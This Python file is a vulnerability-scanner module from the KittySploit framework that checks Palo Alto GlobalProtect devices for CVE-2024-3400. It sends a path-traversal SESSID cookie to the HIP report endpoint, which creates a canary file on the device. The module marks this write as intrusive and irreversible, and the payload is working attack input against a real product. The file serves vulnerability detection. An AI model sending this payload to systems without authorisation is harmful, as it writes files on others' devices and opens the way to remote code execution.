#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Palo Alto GlobalProtect CVE-2024-3400 (path traversal / RCE) detection."""

import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Palo Alto GlobalProtect CVE-2024-3400 Detection',
        'description': (
            'Detects CVE-2024-3400 in Palo Alto Networks PAN-OS GlobalProtect by '
            'confirming the SESSID path-traversal file-create canary (404 then 403).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2024', 'panos', 'globalprotect',
            'paloaltonetworks', 'rce', 'kev', 'vkev', 'vuln', 'intrusive',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {'capability': 'admin_surface', 'from_detail': ''},
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2024-3400',
            'https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-CVE-2024-3400/',
            'https://security.paloaltonetworks.com/CVE-2024-3400',
        ],
        'cve': 'CVE-2024-3400',
    }

    def run(self):
        marker = f'ks-{secrets.token_hex(8)}.txt'
        image_path = f'/global-protect/portal/images/{marker}'
        sessid = (
            f'/../../../var/appweb/sslvpndocs/global-protect/portal/images/{marker}'
        )

        before = self.http_request(method='GET', path=image_path, allow_redirects=False)
        if not before or before.status_code != 404:
            return False

        post = self.http_request(
            method='POST',
            path='/ssl-vpn/hipreport.esp',
            allow_redirects=False,
            headers={
                'Cookie': f'SESSID={sessid};',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            data=(
                'user=global&portal=global&authcookie=e51140e4-4ee3-4ced-9373-96160d68'
                '&domain=global&computer=global&client-ip=global&client-ipv6=global'
                '&md5-sum=global&gwHipReportCheck=global'
            ),
        )
        if not post:
            return False
        body2 = post.text or ''
        if 'invalid required input parameters' not in body2:
            return False

        after = self.http_request(method='GET', path=image_path, allow_redirects=False)
        if not after or after.status_code != 403:
            return False

        self.set_info(
            severity='critical',
            reason='PAN-OS GlobalProtect CVE-2024-3400 path-traversal canary confirmed',
            path=image_path,
            evidence=f'pre={before.status_code} hipreport_ok post={after.status_code}',
        )
        return True
